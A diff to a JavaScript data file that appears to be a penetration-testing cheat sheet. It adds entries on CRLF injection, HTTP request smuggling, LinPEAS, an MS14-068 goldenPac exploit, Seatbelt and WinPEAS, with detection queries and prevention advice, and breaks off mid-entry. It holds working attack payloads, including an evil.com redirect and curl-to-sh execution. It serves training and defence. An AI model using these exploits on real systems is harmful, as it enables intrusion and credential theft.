@@ -30953,6 +30953,93 @@ const COMMAND_DATA = {
       "explain": "Enumerates reachable domain shares to hunt for credential-bearing scripts and configs:\n  Invoke-ShareFinder        PowerView share discovery across the domain\n  -domain <domain>         the domain to enumerate\n  -ExcludeStandard         skip default admin shares (C$, ADMIN$, IPC$)\n  -CheckShareAccess        only list shares your account can actually read\nThen findstr the reachable shares for pass/pw in .ini/.config/.ps1 files - admins often leave net use/runas creds in scripts open to Domain Users."
     },
     {
+      "id": "web-crlf-injection",
+      "name": "CRLF Injection - HTTP Response Splitting & Header Injection",
+      "command": "crlfuzz -u \"https://<target>/path\"",
+      "description": "CRLF injection abuses unsanitized carriage-return/line-feed (%0d%0a) in user input reflected into HTTP responses or logs. Injecting CRLF lets an attacker add headers, split the response (response splitting), set malicious cookies, poison caches, or inject a body for reflected XSS. crlfuzz automates discovery across URLs and parameters.",
+      "platform": "linux",
+      "type": "command",
+      "opsec": "moderate",
+      "category": "Web Exploitation",
+      "subcategory": "HTTP Attacks",
+      "certifications": [
+        "CWES",
+        "CPTS"
+      ],
+      "primary_cert": "CWES",
+      "source": "dwisiswant0/crlfuzz; OWASP",
+      "tags": [
+        "crlf-injection",
+        "response-splitting",
+        "header-injection",
+        "crlfuzz",
+        "http",
+        "cache-poisoning"
+      ],
+      "mitre": [
+        "T1190"
+      ],
+      "exam": "exam-ok",
+      "notes": "=== AUTOMATED DISCOVERY ===\n  crlfuzz -u \"https://<target>/path?param=val\"\n  crlfuzz -l urls.txt -o crlf_hits.txt\n  echo \"https://<target>/\" | crlfuzz -s        # silent, pipe-friendly\n\n=== CORE PAYLOADS (URL-encoded CRLF = %0d%0a) ===\n  /path?q=val%0d%0aSet-Cookie:%20sessid=attacker\n  /path?q=val%0d%0aLocation:%20https://evil.com\n  /redirect?url=%0d%0a%0d%0a<script>alert(1)</script>\n\n=== RESPONSE SPLITTING -> REFLECTED XSS ===\n  value%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0a%0d%0a<script>alert(document.domain)</script>\n\n=== BYPASS FILTERS ===\n  # Try encodings when %0d%0a is blocked:\n  %0d%0a  %0a  %23%0d%0a  \\r\\n  \\u000d\\u000a  (and double-encoding %250d%250a)\n\n=== IMPACT ===\n  - Set-Cookie injection (session fixation)\n  - Open redirect via injected Location\n  - Reflected XSS via injected body\n  - Web cache poisoning\n  - Log injection/forging\n\n=== MANUAL TEST ===\n  curl -si \"https://<target>/path?q=test%0d%0aX-Injected:%20true\"\n  # Look for \"X-Injected: true\" echoed as a real response header",
+      "examples": [
+        {
+          "label": "Fuzz a URL for CRLF",
+          "command": "crlfuzz -u \"https://target.com/redirect?url=test\""
+        },
+        {
+          "label": "Bulk scan + save hits",
+          "command": "crlfuzz -l urls.txt -o crlf_hits.txt"
+        },
+        {
+          "label": "Manual header-injection test",
+          "command": "curl -si \"https://target.com/path?q=test%0d%0aX-Injected:%20true\""
+        }
+      ],
+      "references": [
+        {
+          "title": "crlfuzz",
+          "url": "https://github.com/dwisiswant0/crlfuzz"
+        },
+        {
+          "title": "OWASP - CRLF Injection",
+          "url": "https://owasp.org/www-community/vulnerabilities/CRLF_Injection"
+        }
+      ],
+      "recommended": [
+        {
+          "id": "web-request-smuggling",
+          "note": "Request smuggling also abuses HTTP parsing boundaries.",
+          "rel": "alternative"
+        },
+        {
+          "id": "xss-cookie-stealer",
+          "note": "CRLF-injected body can deliver reflected XSS.",
+          "rel": "next"
+        },
+        {
+          "id": "ssrf-exploit",
+          "note": "Open-redirect from CRLF can chain into SSRF.",
+          "rel": "next"
+        }
+      ],
+      "defense": {
+        "why_it_works": "If user input containing CR (%0d) and LF (%0a) is placed into an HTTP header or response without sanitization, the attacker can terminate the current header line and inject new headers or a new response body.",
+        "prerequisites": "A parameter reflected into a response header (Location, Set-Cookie, custom) or log, with no CRLF filtering.",
+        "impact": "Session fixation, open redirect, reflected XSS, cache poisoning, log forgery.",
+        "detection": "[MITRE T1190] Requests containing %0d%0a / %0a / encoded CRLF in parameters; responses echoing attacker-controlled header names; crlfuzz traffic patterns.",
+        "artifacts": "Web logs with encoded CRLF in query/body; anomalous injected headers in responses.",
+        "splunk_spl": "index=web (uri_query=\"*%0d%0a*\" OR uri_query=\"*%0a*\" OR uri_query=\"*\\r\\n*\")\n| stats count by src_ip, uri_path",
+        "elastic_kql": "url.query:(*%0d%0a* or *%250d%250a*)",
+        "sentinel_kql": "_Im_WebSession\n| where Url has_any (\"%0d%0a\",\"%0a\",\"%250d%250a\")\n| project TimeGenerated, SrcIpAddr, Url",
+        "sigma_rules": "web_crlf_injection_attempt",
+        "prevention": "Strip/reject CR and LF from any value used in headers; use framework header APIs that encode or forbid CRLF; validate/allowlist redirect targets; never reflect raw user input into Set-Cookie/Location.",
+        "sources": [
+          "OWASP CRLF Injection",
+          "https://attack.mitre.org/techniques/T1190/"
+        ]
+      }
+    },
+    {
       "type": "command",
       "platform": "linux",
       "requires": [
@@ -61060,6 +61147,94 @@ const COMMAND_DATA = {
       "explain": "HTTP traffic analysis for malicious activity: directory fuzzing (rapid 404s from one host), parameter/IDOR fuzzing (sequential ID modification), strange Host headers (virtual host confusion), CRLF/HTTP request smuggling (injected CR+LF to split requests), and XSS cookie theft (JavaScript exfiltrating cookies via GET requests).\nAlso covers Apache access log analysis to correlate Wireshark findings.\n=== DIRECTORY FUZZING DETECTION ===\nHow it works:\n   Attacker uses tools (ffuf, gobuster, dirb) to probe all possible web paths\n   Sends rapid HTTP GET requests for paths that don't exist\n   Dis..."
     },
     {
+      "id": "web-request-smuggling",
+      "name": "HTTP Request Smuggling - CL.TE / TE.CL Desync",
+      "command": "python3 smuggler.py -u https://<target>/",
+      "description": "HTTP request smuggling exploits disagreement between a front-end proxy and back-end server on where one request ends, using conflicting Content-Length and Transfer-Encoding headers (CL.TE, TE.CL, TE.TE). A smuggled request prefix poisons the next users request, enabling auth bypass, cache poisoning, credential capture, and request hijacking. smuggler.py detects the desync class.",
+      "platform": "linux",
+      "type": "command",
+      "opsec": "moderate",
+      "category": "Web Exploitation",
+      "subcategory": "HTTP Attacks",
+      "certifications": [
+        "CWES",
+        "CPTS"
+      ],
+      "primary_cert": "CWES",
+      "source": "defparam/smuggler; PortSwigger research",
+      "tags": [
+        "request-smuggling",
+        "desync",
+        "cl-te",
+        "te-cl",
+        "http",
+        "cache-poisoning",
+        "smuggler"
+      ],
+      "mitre": [
+        "T1190"
+      ],
+      "exam": "exam-ok",
+      "notes": "=== DETECT DESYNC CLASS ===\n  python3 smuggler.py -u https://<target>/\n  # Tests CL.TE, TE.CL, TE.TE timing-based; reports likely-vulnerable endpoints\n  python3 smuggler.py -u https://<target>/ -q     # quiet\n  cat urls.txt | python3 smuggler.py              # bulk\n\n=== CL.TE (front-end uses Content-Length, back-end uses Transfer-Encoding) ===\n  POST / HTTP/1.1\n  Host: <target>\n  Content-Length: 13\n  Transfer-Encoding: chunked\n\n  0\n\n  SMUGGLED\n  # The \"SMUGGLED\" prefix is prepended to the next request on that connection\n\n=== TE.CL (front-end TE, back-end CL) ===\n  Content-Length: 3\n  Transfer-Encoding: chunked\n\n  8\n  SMUGGLED\n  0\n\n=== IMPACT / FOLLOW-UP ===\n  - Bypass front-end security controls (hit restricted paths)\n  - Capture other users requests (steal session cookies)\n  - Web cache poisoning -> stored XSS / redirect\n  - Response queue poisoning\n\n=== TOOLS ===\n  smuggler.py            # detection\n  Burp Repeater (HTTP/1.1, disable Content-Length update) + \"HTTP Request Smuggler\" extension\n  h2csmuggler            # HTTP/2 downgrade smuggling\n\n=== MANUAL VERIFY ===\n  # Send the crafted request twice; a differential/time-delay response confirms desync",
+      "examples": [
+        {
+          "label": "Detect desync class",
+          "command": "python3 smuggler.py -u https://target.com/"
+        },
+        {
+          "label": "Bulk scan URL list",
+          "command": "cat urls.txt | python3 smuggler.py -q"
+        },
+        {
+          "label": "HTTP/2 downgrade smuggling",
+          "command": "python3 h2csmuggler.py -x https://target.com/ --test"
+        }
+      ],
+      "references": [
+        {
+          "title": "smuggler",
+          "url": "https://github.com/defparam/smuggler"
+        },
+        {
+          "title": "PortSwigger - HTTP request smuggling",
+          "url": "https://portswigger.net/web-security/request-smuggling"
+        }
+      ],
+      "recommended": [
+        {
+          "id": "verb-tampering-bypass-auth",
+          "note": "Another front-end control bypass technique.",
+          "rel": "alternative"
+        },
+        {
+          "id": "web-ssti",
+          "note": "Chain smuggling with other injection for stored impact.",
+          "rel": "alternative"
+        },
+        {
+          "id": "web-crlf-injection",
+          "note": "CRLF injection also manipulates HTTP parsing.",
+          "rel": "alternative"
+        }
+      ],
+      "defense": {
+        "why_it_works": "When a front-end proxy and back-end server interpret Content-Length vs Transfer-Encoding differently, a single TCP connection carries requests whose boundaries disagree, letting attacker bytes be treated as the start of a victim request.",
+        "prerequisites": "A chained front-end/back-end HTTP stack (proxy, load balancer, CDN) with inconsistent header handling; connection reuse to the back-end.",
+        "impact": "Auth bypass, session/credential theft from other users, cache poisoning, mass request hijacking.",
+        "detection": "[MITRE T1190] Requests containing both Content-Length and Transfer-Encoding; malformed/obfuscated Transfer-Encoding (\"Transfer-Encoding : chunked\", duplicate TE); timing anomalies; unexpected request fragments in back-end logs.",
+        "artifacts": "WAF/proxy logs with ambiguous length headers; back-end requests with prepended attacker content; smuggler.py User-Agent patterns.",
+        "splunk_spl": "index=web (header=\"*Transfer-Encoding*\" AND header=\"*Content-Length*\")\n| stats count by src_ip, uri_path\n| where count > 1",
+        "elastic_kql": "http.request.headers.transfer-encoding:* and http.request.headers.content-length:*",
+        "sentinel_kql": "_Im_WebSession\n| where AdditionalFields has \"Transfer-Encoding\" and AdditionalFields has \"Content-Length\"\n| project TimeGenerated, SrcIpAddr, Url, AdditionalFields",
+        "sigma_rules": "web_http_request_smuggling",
+        "prevention": "Use HTTP/2 end-to-end (no downgrade); reject requests with both CL and TE; normalize/strip ambiguous headers at the edge; disable back-end connection reuse or ensure consistent parsing; patch proxies/CDNs.",
+        "sources": [
+          "PortSwigger",
+          "https://attack.mitre.org/techniques/T1190/"
+        ]
+      }
+    },
+    {
       "type": "payload",
       "platform": "linux",
       "requires": [
@@ -80925,6 +81100,112 @@ const COMMAND_DATA = {
       "explain": "Connects the Ligolo-ng agent on a compromised pivot back to your proxy, creating a virtual TUN interface locally:\n  ./agent          the implant run on the pivot\n  -connect <attacker_ip>:11601   dial back to the proxy you started with -selfcert\n  -ignore-cert     accept the proxy's self-signed TLS cert\nAfter 'session' + a route to the subnet via the ligolo interface + 'start', you reach the internal network with normal tools - no proxychains."
     },
     {
+      "id": "linux-linpeas",
+      "name": "LinPEAS - Linux Privilege Escalation Enumeration",
+      "command": "curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh",
+      "description": "LinPEAS is the de-facto Linux privilege escalation enumeration script. It automatically audits the host for hundreds of privesc vectors - SUID/SGID binaries, sudo rules, capabilities, cron jobs, writable files, kernel exploits, credentials in files, container escapes, and more - and color-codes findings by likelihood (red/yellow = probably exploitable). First tool to run after landing a Linux shell.",
+      "platform": "linux",
+      "type": "command",
+      "opsec": "loud",
+      "category": "Post-Exploitation",
+      "subcategory": "Privilege Escalation",
+      "certifications": [
+        "OSCP",
+        "CPTS"
+      ],
+      "primary_cert": "OSCP",
+      "source": "peass-ng/PEASS-ng",
+      "tags": [
+        "linpeas",
+        "privesc",
+        "enumeration",
+        "peass",
+        "suid",
+        "sudo",
+        "linux",
+        "automation"
+      ],
+      "mitre": [
+        "T1082",
+        "T1083"
+      ],
+      "exam": "exam-ok",
+      "notes": "=== RUN FROM MEMORY (no disk write) ===\n  curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh\n  wget -q https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh -O- | sh\n\n=== TRANSFER + RUN (no egress) ===\n  # Attacker:\n  python3 -m http.server 80\n  # Target:\n  wget http://<lhost>/linpeas.sh -O /tmp/linpeas.sh && chmod +x /tmp/linpeas.sh && /tmp/linpeas.sh\n\n=== USEFUL OPTIONS ===\n  ./linpeas.sh -a            # all checks (thorough, slower)\n  ./linpeas.sh -s            # stealth/superfast (fewer, quieter checks)\n  ./linpeas.sh -e            # extra/deep enumeration\n  ./linpeas.sh -o SysI,Devs  # only specific check groups\n  ./linpeas.sh | tee linpeas_out.txt   # keep output\n\n=== SAVE COLOR OUTPUT TO VIEW LATER ===\n  ./linpeas.sh -a > linpeas.txt 2>&1\n  less -r linpeas.txt   # preserve ANSI colors\n\n=== READING RESULTS ===\n  # RED/YELLOW highlight = 95% likely a privesc vector\n  # RED = almost certainly exploitable\n  # Focus on: SUID, sudo -l, capabilities, cron, writable service files, creds\n\n=== ALTERNATIVES / COMPLEMENTS ===\n  linux-exploit-suggester.sh   # kernel CVE matching\n  pspy                          # watch cron/process activity live\n  LinEnum.sh, lse.sh            # lighter scripts\n  # Always verify LinPEAS findings manually",
+      "examples": [
+        {
+          "label": "Run from memory (fileless)",
+          "command": "curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh"
+        },
+        {
+          "label": "Transfer and run thorough",
+          "command": "wget http://10.10.14.5/linpeas.sh -O /tmp/lp.sh && chmod +x /tmp/lp.sh && /tmp/lp.sh -a | tee lp.txt"
+        },
+        {
+          "label": "Stealth mode",
+          "command": "./linpeas.sh -s"
+        }
+      ],
+      "references": [
+        {
+          "title": "PEASS-ng",
+          "url": "https://github.com/peass-ng/PEASS-ng"
+        },
+        {
+          "title": "MITRE T1082 - System Information Discovery",
+          "url": "https://attack.mitre.org/techniques/T1082/"
+        }
+      ],
+      "recommended": [
+        {
+          "id": "linux-exploit-suggester",
+          "note": "Match kernel version to public exploits after LinPEAS.",
+          "rel": "next"
+        },
+        {
+          "id": "find-suid-sgid",
+          "note": "Manually exploit SUID/SGID binaries LinPEAS flags.",
+          "rel": "next"
+        },
+        {
+          "id": "linux-pspy",
+          "note": "Watch cron/process activity LinPEAS hints at.",
+          "rel": "next"
+        }
+      ],
+      "defense": {
+        "why_it_works": "LinPEAS reads world-readable system state (binaries, config, process list, cron, sudo rules) that any user can enumerate. It is loud but uses only normal read operations, so it rarely errors out.",
+        "prerequisites": "Any shell on the target (even low-priv); a shell interpreter.",
+        "impact": "Rapid, comprehensive mapping of every local privilege-escalation vector.",
+        "detection": "[MITRE T1082/T1083] Burst of enumeration commands (id, sudo -l, uname, find / -perm, cat of many config files) in seconds; download of linpeas.sh; large sequential file reads.",
+        "artifacts": "linpeas.sh on disk or in bash history; auditd execve spikes; process spawning hundreds of child commands rapidly.",
+        "splunk_spl": "index=linux (process_name IN (\"find\",\"sudo\",\"uname\",\"getcap\") OR CommandLine=\"*linpeas*\")\n| bin _time span=1m\n| stats count by host, user\n| where count > 50",
+        "elastic_kql": "process.command_line:*linpeas* or process.name:(\"find\" and \"getcap\")",
+        "sentinel_kql": "let win=1m;\nSyslog\n| where SyslogMessage has \"linpeas\" or SyslogMessage has_any (\"sudo -l\",\"getcap -r\")\n| summarize count() by Computer, bin(TimeGenerated, win)",
+        "sigma_rules": "lnx_privesc_enumeration_linpeas",
+        "prevention": "Harden the host so enumeration yields nothing (no exploitable SUID, least-privilege sudo, patched kernel, no creds in files); auditd alerting on mass enumeration; EDR on Linux; minimal toolchain on servers.",
+        "sources": [
+          "PEASS-ng",
+          "https://attack.mitre.org/techniques/T1082/"
+        ],
+        "detections": [
+          {
+            "platform": "elastic",
+            "name": "Mass local enumeration (LinPEAS-style)",
+            "logic": "process.name:(\"find\" or \"getcap\" or \"sudo\" or \"uname\") and event.action:\"exec\"",
+            "data_source": "linux-audit",
+            "attack": [
+              "T1082",
+              "T1083"
+            ],
+            "fidelity": "behavioral",
+            "confidence": "medium",
+            "false_positives": "Admin troubleshooting, config-management agents (Ansible/Puppet)",
+            "tuning": "Correlate many enumeration execs from one PID/session in a short window; exclude known automation accounts"
+          }
+        ]
+      }
+    },
+    {
       "id": "linux-unshadow",
       "name": "Linux - Crack Local Passwords (unshadow)",
       "command": "unshadow /etc/passwd /etc/shadow > unshadowed.hashes",
@@ -96454,6 +96735,111 @@ const COMMAND_DATA = {
         }
       },
       "explain": "Runs a task as SYSTEM via the MS10-092 Task Scheduler XML flaw (Metasploit local exploit):\n  use exploit/windows/local/ms10_092_schelevator   load the module\nRun it against an existing Meterpreter session (set SESSION, LHOST, LPORT) after migrating to a 64-bit process; it abuses a task-integrity flaw to execute as SYSTEM. Classic on Server 2008."
+    },
+    {
+      "id": "ad-ms14-068-goldenpac",
+      "name": "MS14-068 (goldenPac) - Kerberos PAC Privilege Forgery",
+      "command": "goldenPac.py <domain>/<user>:<password>@<dc_host>",
+      "description": "MS14-068 exploits a flaw in how unpatched Key Distribution Centers validate the Kerberos PAC, letting any domain user forge a ticket claiming Domain Admin membership. Impacket goldenPac.py automates the end-to-end chain: request a ticket, inject a forged PAC, and get a shell as a privileged user on the DC. Still relevant on legacy/unpatched 2008-2012 domains.",
+      "platform": "windows",
+      "type": "command",
+      "opsec": "loud",
+      "category": "Active Directory",
+      "subcategory": "Privilege Escalation",
+      "certifications": [
+        "CRTP",
+        "OSCP"
+      ],
+      "primary_cert": "CRTP",
+      "source": "Impacket goldenPac.py; MS14-068 (CVE-2014-6324)",
+      "tags": [
+        "ms14-068",
+        "goldenpac",
+        "kerberos",
+        "pac",
+        "cve-2014-6324",
+        "privilege-escalation",
+        "impacket"
+      ],
+      "mitre": [
+        "T1068",
+        "T1558"
+      ],
+      "exam": "exam-ok",
+      "notes": "=== PRECONDITIONS ===\n  # - A valid (any) domain user account + password\n  # - DC missing the MS14-068 patch (KB3011780) - typically 2008/2008R2/2012 pre-Nov-2014\n  # - The target DC FQDN (not just IP) for Kerberos\n\n=== ONE-SHOT EXPLOIT (shell on DC) ===\n  goldenPac.py <domain>/<user>:<password>@<dc_host>\n  # e.g.\n  goldenPac.py lab.local/jdoe:Passw0rd!@dc01.lab.local\n  # Drops to a SYSTEM shell on the DC via psexec-style execution\n\n=== MANUAL CHAIN (pykek / ms14-068.py) ===\n  python ms14-068.py -u <user>@<domain> -p <password> -s <user_sid> -d <dc_host>\n  # Produces a TGT.ccache with forged Domain Admin PAC\n  export KRB5CCNAME=TGT_<user>@<domain>.ccache\n  psexec.py -k -no-pass <domain>/<user>@<dc_host>\n\n=== GET THE USER SID FIRST ===\n  lookupsid.py <domain>/<user>:<password>@<dc_ip>\n  # or: wmic useraccount get name,sid    (on a domain host)\n\n=== CHECK IF PATCHED ===\n  # KB3011780 present => not vulnerable. Modern DCs are patched.\n\n=== RELATED ===\n  # Golden Ticket (post-DA) is a different attack: forge TGT with krbtgt hash",
+      "examples": [
+        {
+          "label": "One-shot goldenPac exploit",
+          "command": "goldenPac.py lab.local/jdoe:Passw0rd!@dc01.lab.local"
+        },
+        {
+          "label": "Get user SID (prereq)",
+          "command": "lookupsid.py lab.local/jdoe:Passw0rd!@10.10.10.5"
+        },
+        {
+          "label": "Manual pykek + psexec",
+          "command": "python ms14-068.py -u jdoe@lab.local -p Passw0rd! -s S-1-5-21-...-1103 -d dc01.lab.local"
+        }
+      ],
+      "references": [
+        {
+          "title": "MS14-068 / CVE-2014-6324",
+          "url": "https://learn.microsoft.com/en-us/security-updates/securitybulletins/2014/ms14-068"
+        },
+        {
+          "title": "MITRE T1068 - Exploitation for Privilege Escalation",
+          "url": "https://attack.mitre.org/techniques/T1068/"
+        }
+      ],
+      "recommended": [
+        {
+          "id": "ad-golden-ticket-mimikatz",
+          "note": "Golden Ticket is the post-DA krbtgt forgery (different attack).",
+          "rel": "alternative"
+        },
+        {
+          "id": "ad-getuserspns-request",
+          "note": "Kerberoasting is an alternative path to privileged creds.",
+          "rel": "alternative"
+        },
+        {
+          "id": "ad-secretsdump-dcsync",
+          "note": "After DC compromise, DCSync all hashes.",
+          "rel": "next"
+        }
+      ],
+      "defense": {
+        "why_it_works": "Unpatched KDCs accept a PAC signed with any key (including one the attacker controls) instead of only the KDC key, so a forged PAC claiming Domain Admin group membership is trusted - escalating any domain user to DA.",
+        "prerequisites": "Any valid domain account; a DC missing KB3011780.",
+        "impact": "Immediate domain compromise (Domain Admin / SYSTEM on the DC) from an unprivileged account.",
+        "detection": "[MITRE T1068/T1558] 4769/4768 tickets where PAC privileges do not match the account; TGS requests with anomalous PAC; psexec-style service creation on the DC (7045/4697) right after an odd Kerberos exchange; account suddenly acting as DA.",
+        "artifacts": "Forged ticket usage; service install on DC; mismatch between the account and its effective group membership in logs.",
+        "splunk_spl": "index=windows (EventCode=4769 OR EventCode=4768)\n| join TargetUserName [search index=windows EventCode=4672]\n| table _time, TargetUserName, IpAddress, ServiceName",
+        "elastic_kql": "event.code:(4768 or 4769) and winlog.event_data.TargetUserName:*",
+        "sentinel_kql": "SecurityEvent\n| where EventID in (4768,4769,4672,7045)\n| where Computer has \"DC\"\n| project TimeGenerated, EventID, Account, Computer, IpAddress",
+        "sigma_rules": "win_ms14_068_pac_forgery",
+        "prevention": "PATCH (KB3011780) - the only real fix; this attack is dead on patched DCs. Monitor for privilege mismatches in PAC; alert on unexpected service creation on DCs; retire EOL Windows Server versions.",
+        "sources": [
+          "Microsoft MS14-068",
+          "https://attack.mitre.org/techniques/T1068/"
+        ],
+        "detections": [
+          {
+            "platform": "splunk",
+            "name": "Unexpected privileged logon following Kerberos ticket (MS14-068)",
+            "logic": "index=windows EventCode=4672 Computer=\"*DC*\"\n| join type=inner TargetLogonId [search index=windows EventCode=4624 LogonType=3]\n| table _time, TargetUserName, Computer, IpAddress",
+            "data_source": "windows-security",
+            "attack": [
+              "T1068",
+              "T1558"
+            ],
+            "fidelity": "behavioral",
+            "confidence": "medium",
+            "false_positives": "Legitimate admin logons to DCs",
+            "tuning": "Alert when an account with no DA membership suddenly receives SeTcbPrivilege/admin rights on a DC"
+          }
+        ]
+      }
     },
     {
       "type": "command",
@@ -137865,6 +138251,110 @@ const COMMAND_DATA = {
         }
       },
       "explain": "Searches the local Exploit-DB copy for public exploits:\n  searchsploit <product> <version>   match a fingerprinted service to known exploits\nMaps a version to available PoCs; run 'searchsploit --update' first to refresh the DB, and 'searchsploit -x <id>' to read one before use."
+    },
+    {
+      "id": "seatbelt-enum",
+      "name": "Seatbelt - Windows Host Situational Awareness",
+      "command": "Seatbelt.exe -group=all",
+      "description": "Seatbelt is a C# tool that gathers Windows \"safety checks\" for situational awareness from both offensive and defensive perspectives: tokens, UAC, LAPS, LSA settings, credential files, browser data, RDP sessions, PowerShell history, WEF/Sysmon config, AV/EDR presence, and more. Complements WinPEAS with cleaner, grouped, EDR-aware host triage.",
+      "platform": "windows",
+      "type": "command",
+      "opsec": "moderate",
+      "category": "Post-Exploitation",
+      "subcategory": "Enumeration",
+      "certifications": [
+        "CRTP",
+        "CPTS"
+      ],
+      "primary_cert": "CRTP",
+      "source": "GhostPack/Seatbelt",
+      "tags": [
+        "seatbelt",
+        "ghostpack",
+        "enumeration",
+        "situational-awareness",
+        "windows",
+        "triage"
+      ],
+      "mitre": [
+        "T1082",
+        "T1518.001"
+      ],
+      "exam": "exam-ok",
+      "notes": "=== RUN ALL CHECKS ===\n  Seatbelt.exe -group=all\n  Seatbelt.exe -group=all -full       # no truncation\n  Seatbelt.exe -group=all -outputfile=\"C:\\Windows\\Temp\\sb.txt\"\n\n=== CHECK GROUPS ===\n  Seatbelt.exe -group=user      # user context, creds, history\n  Seatbelt.exe -group=system    # system config, patches, services\n  Seatbelt.exe -group=remote    # remote/network (run before pivoting)\n  Seatbelt.exe -group=slack     # Slack/Teams creds\n  Seatbelt.exe -group=chromium  # browser data\n\n=== SPECIFIC CHECKS ===\n  Seatbelt.exe TokenPrivileges UAC LAPS LSASettings\n  Seatbelt.exe WindowsCredentialFiles CloudCredentials\n  Seatbelt.exe PowerShellHistory PuttySessions\n  Seatbelt.exe DotNet AMSIProviders Sysmon WindowsDefender   # evasion recon\n\n=== DEFENSIVE / BLUE USE ===\n  # Quickly audit a host for exposed creds + logging gaps\n  Seatbelt.exe -group=all -full\n\n=== ALTERNATIVES ===\n  WinPEAS      # broader privesc focus\n  PrivescCheck # PowerShell\n  SharpUp      # service misconfig exploitation",
+      "examples": [
+        {
+          "label": "All checks, full output to file",
+          "command": "Seatbelt.exe -group=all -full -outputfile=\"C:\\Windows\\Temp\\sb.txt\""
+        },
+        {
+          "label": "Evasion recon (AMSI/Sysmon/Defender)",
+          "command": "Seatbelt.exe DotNet AMSIProviders Sysmon WindowsDefender"
+        },
+        {
+          "label": "Hunt stored credentials",
+          "command": "Seatbelt.exe WindowsCredentialFiles CloudCredentials PuttySessions"
+        }
+      ],
+      "references": [
+        {
+          "title": "Seatbelt",
+          "url": "https://github.com/GhostPack/Seatbelt"
+        },
+        {
+          "title": "MITRE T1518.001 - Security Software Discovery",
+          "url": "https://attack.mitre.org/techniques/T1518/001/"
+        }
+      ],
+      "recommended": [
+        {
+          "id": "winpeas-enum",
+          "note": "WinPEAS for broader privesc vector coverage.",
+          "rel": "alternative"
+        },
+        {
+          "id": "privesc-privesccheck",
+          "note": "PrivescCheck is a stealthier PowerShell option.",
+          "rel": "alternative"
+        },
+        {
+          "id": "sharpup-audit",
+          "note": "Exploit service misconfigs after triage.",
+          "rel": "next"
+        }
+      ],
+      "defense": {
+        "why_it_works": "Seatbelt reads local configuration and credential-store locations via standard APIs. As a GhostPack C# tool it is often flagged by EDR, but unobfuscated reads of config/cred files succeed where not blocked.",
+        "prerequisites": "Shell on the target; .NET runtime; Seatbelt binary (or in-memory via C2).",
+        "impact": "Reveals stored credentials, privilege/UAC posture, and (critically) the host logging/EDR configuration enabling further evasion.",
+        "detection": "[MITRE T1082/T1518.001] Seatbelt binary/assembly signatures; reads of PowerShell history, PuTTY/WinSCP registry, browser cred stores; queries of Sysmon/Defender/AMSI configuration.",
+        "artifacts": "Seatbelt.exe or in-memory .NET assembly load (4104/CLR ETW); access to ConsoleHost_history.txt, cred vaults, AV config keys.",
+        "splunk_spl": "index=windows EventCode=4688 (NewProcessName=\"*Seatbelt*\" OR CommandLine=\"*-group=all*\")\n| table _time, SubjectUserName, NewProcessName, CommandLine",
+        "elastic_kql": "process.name:*Seatbelt* or process.command_line:*-group=all*",
+        "sentinel_kql": "DeviceProcessEvents\n| where FileName has \"Seatbelt\" or ProcessCommandLine has \"-group=all\"\n| project Timestamp, DeviceName, AccountName, FileName, ProcessCommandLine",
+        "sigma_rules": "win_seatbelt_situational_awareness",
+        "prevention": "Credential Guard; remove stored plaintext creds (PuTTY/WinSCP/cloud CLI); enable AMSI + script block logging (so in-memory loads are caught); EDR signatures for GhostPack; restrict .NET where feasible.",
+        "sources": [
+          "GhostPack",
+          "https://attack.mitre.org/techniques/T1518/001/"
+        ],
+        "detections": [
+          {
+            "platform": "sentinel",
+            "name": "Seatbelt host enumeration",
+            "logic": "union DeviceProcessEvents, DeviceEvents\n| where FileName has \"Seatbelt\" or ProcessCommandLine has_any (\"-group=all\",\"AMSIProviders\",\"LSASettings\")\n| project Timestamp, DeviceName, AccountName, FileName, ProcessCommandLine",
+            "data_source": "defender-endpoint",
+            "attack": [
+              "T1082",
+              "T1518.001"
+            ],
+            "fidelity": "signature",
+            "confidence": "high",
+            "false_positives": "Authorized security assessments",
+            "tuning": "Also detect in-memory execution via Script Block / CLR ETW when run through C2"
+          }
+        ]
+      }
     },
     {
       "id": "ad-secretsdump-dcsync",
@@ -182842,6 +183332,112 @@ const COMMAND_DATA = {
       "explain": "Enumerates your token privileges and group memberships - the key privesc signal:\n  whoami /priv             list the current token's privileges\nSeImpersonate, SeDebug, SeBackup, SeTakeOwnership, and SeLoadDriver each map to a specific escalation path. The variations add whoami /groups and local user/group membership (net localgroup administrators)."
     },
     {
+      "id": "winpeas-enum",
+      "name": "WinPEAS - Windows Privilege Escalation Enumeration",
+      "command": "winPEASx64.exe",
+      "description": "WinPEAS is the de-facto Windows privilege escalation enumeration tool. It audits the host for privesc vectors - unquoted service paths, weak service/registry permissions, AlwaysInstallElevated, token privileges (SeImpersonate etc.), stored credentials, scheduled tasks, DPAPI, autologon, and known kernel/CVE indicators - and highlights likely findings in color. First tool to run after landing a Windows shell.",
+      "platform": "windows",
+      "type": "command",
+      "opsec": "loud",
+      "category": "Post-Exploitation",
+      "subcategory": "Privilege Escalation",
+      "certifications": [
+        "OSCP",
+        "CPTS"
+      ],
+      "primary_cert": "OSCP",
+      "source": "peass-ng/PEASS-ng",
+      "tags": [
+        "winpeas",
+        "privesc",
+        "enumeration",
+        "peass",
+        "windows",
+        "services",
+        "tokens",
+        "automation"
+      ],
+      "mitre": [
+        "T1082",
+        "T1083"
+      ],
+      "exam": "exam-ok",
